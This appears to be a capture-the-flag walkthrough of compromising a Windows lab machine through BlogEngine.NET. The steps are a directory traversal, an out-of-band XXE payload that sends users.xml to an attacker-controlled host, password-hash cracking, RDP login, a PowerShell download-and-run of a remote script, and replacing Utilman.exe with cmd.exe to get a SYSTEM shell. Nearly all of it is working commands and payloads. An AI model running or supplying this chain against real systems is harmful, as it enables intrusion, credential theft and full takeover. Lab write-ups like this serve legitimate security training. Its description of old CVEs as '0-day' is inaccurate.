DETAILED DESCRIPTION OF EXECUTED STEPS:
1. Reconnaissance and Attack Surface Analysis Phase
bash
nmap -T4 -n -sC -sV -Pn -p- 10.201.52.221 -oN nmap_initial.txt
Discovered open ports:

80/tcp - Microsoft IIS httpd 10.0

3389/tcp - Microsoft Terminal Services

5985/tcp - Microsoft HTTPAPI httpd 2.0 (WinRM)

2. Web Content Discovery and Vulnerable Component Identification
Manual analysis of the web application structure:

bash
curl -s http://10.201.52.221/blog/ | head -n 10
Identified BlogEngine.NET version 3.3.7.0.

3. Directory Traversal Exploitation (CVE-2019-10717)
Exploiting the vulnerability in the filemanager API:

bash
curl -s "http://10.201.52.221/blog/api/filemanager?path=%2F..%2f..%2f"
Obtained detailed filesystem information, confirmed existence of a critical file:

json
{"Name":"users.xml","FullPath":"/../../App_Data/users.xml"}
4. OOB-XXE Attack Infrastructure Preparation
Creating exploits on the attacking machine:

bash
cat > exfil.dtd << 'EOF'
<!ENTITY % p1 SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://10.201.42.220:445/?exfil=%p1;'>">
%p2;
EOF

cat > oob.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://10.201.42.220:445/exfil.dtd">
<foo>&e1;</foo>
EOF
Launching HTTP server on port 445:

bash
sudo python3 -m http.server 445
5. XXE Attack Execution (CVE-2019-11392)
Triggering malicious XML processing:

bash
curl -v "http://10.201.52.221/blog/syndication.axd?apml=http://10.201.42.220:445/oob.xml"
Successful data exfiltration with URL-encoded users.xml content obtained.

6. Decoding and Analysis of Exfiltrated Data
Saving and transforming data:

bash
python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))" < encoded_users.txt
Obtained user structure with Base64 password hashes.

7. Hash Conversion and Cracking
Base64 to HEX conversion:

bash
echo "wobS/AvKFPT5qP9FgQyh7C+kc+k+1rBzbOf7Oxfptw0=" | base64 -d | xxd -p -c 32
c286d2fc0bca14f4f9a8ff45810ca1ec2fa473e93ed6b0736ce7fb3b17e9b70d

echo "hJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=" | base64 -d | xxd -p -c 32
84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
Cracking with John the Ripper:

bash
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes_john.txt
Successfully obtained password: guest for user guest.

8. Discovery of Additional Credentials
Authentication in the admin panel (/blog/admin/) and analysis of page drafts revealed critical information: password Excal1burP@ss1337 for user kingarthy.

9. RDP Access Establishment
Remote desktop session establishment:

bash
xfreerdp /v:10.201.52.221 /u:kingarthy /p:Excal1burP@ss1337 /size:1200x800 +clipboard /cert:ignore
10. Privilege Escalation via Access Rights Abuse
Privilege activation:

powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.201.42.220:8000/EnableAllTokenPrivs.ps1')
System file modification:

cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant kingarthy:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
11. SYSTEM Shell Acquisition
By triggering "Ease of Access" on the lock screen, a command interpreter with maximum privileges was obtained.

12. Final Flag Discovery
    
User flag
Root flag

CONCLUSIONS AND SUMMARY:
The project demonstrated the critical importance of:

Timely component updates - the outdated BlogEngine version contained multiple 0-day vulnerabilities

Network access segmentation - the open RDP port allowed the use of compromised credentials

Principle of least privilege - the user's SeTakeOwnershipPrivilege led to complete system compromise

The technical complexity involved combining four different vulnerabilities to achieve the final objective, representing a realistic modern cyber attack scenario. The project successfully highlighted attack chain construction techniques from initial reconnaissance to full system dominance.
